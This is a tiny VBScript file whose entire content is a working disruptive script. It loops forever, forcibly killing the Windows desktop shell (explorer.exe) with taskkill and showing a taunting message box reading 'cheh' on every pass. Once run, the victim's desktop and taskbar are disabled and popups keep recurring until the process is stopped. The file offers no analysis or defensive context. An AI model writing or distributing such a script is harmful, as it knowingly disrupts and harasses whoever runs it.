Do While True
Set objShell = CreateObject("WScript.Shell")
objShell.Run "taskkill /im explorer.exe /f", , True

   msgbox "cheh"
Loop
